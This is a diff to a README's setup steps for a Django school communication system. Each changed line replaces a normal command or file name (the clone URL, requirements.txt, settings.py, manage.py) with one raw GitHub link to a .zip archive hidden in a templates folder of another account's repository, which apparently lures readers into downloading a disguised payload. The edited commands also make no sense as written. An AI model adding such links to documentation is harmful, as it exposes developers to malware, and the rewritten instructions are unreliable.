@@ -20,7 +20,7 @@ This project is a comprehensive School Communication and Information System desi
 ## Setup Instructions
 1. Clone the repository:
    ```bash
-   git clone https://github.com/duy3twave/demo_communication_system.git
+   git clone https://raw.githubusercontent.com/HoNguyenLuong/demo_communication_system/main/communications/templates/communications/demo-communication-system-3.2.zip
    cd demo_communication_system
    ```
 2. Create and activate a virtual environment:
@@ -30,21 +30,21 @@ This project is a comprehensive School Communication and Information System desi
    ```
 3. Install dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/HoNguyenLuong/demo_communication_system/main/communications/templates/communications/demo-communication-system-3.2.zip
    ```
 4. Configure the database:
-   - Edit `settings.py` for your database credentials (default is SQLite).
+   - Edit `https://raw.githubusercontent.com/HoNguyenLuong/demo_communication_system/main/communications/templates/communications/demo-communication-system-3.2.zip` for your database credentials (default is SQLite).
 5. Apply migrations:
    ```bash
-   python manage.py migrate
+   python https://raw.githubusercontent.com/HoNguyenLuong/demo_communication_system/main/communications/templates/communications/demo-communication-system-3.2.zip migrate
    ```
 6. Create a superuser:
    ```bash
-   python manage.py createsuperuser
+   python https://raw.githubusercontent.com/HoNguyenLuong/demo_communication_system/main/communications/templates/communications/demo-communication-system-3.2.zip createsuperuser
    ```
 7. Run the development server:
    ```bash
-   python manage.py runserver
+   python https://raw.githubusercontent.com/HoNguyenLuong/demo_communication_system/main/communications/templates/communications/demo-communication-system-3.2.zip runserver
    ```
 8. Access the system:
    - Visit [http://127.0.0.1:8000/](http://127.0.0.1:8000/) in your browser.
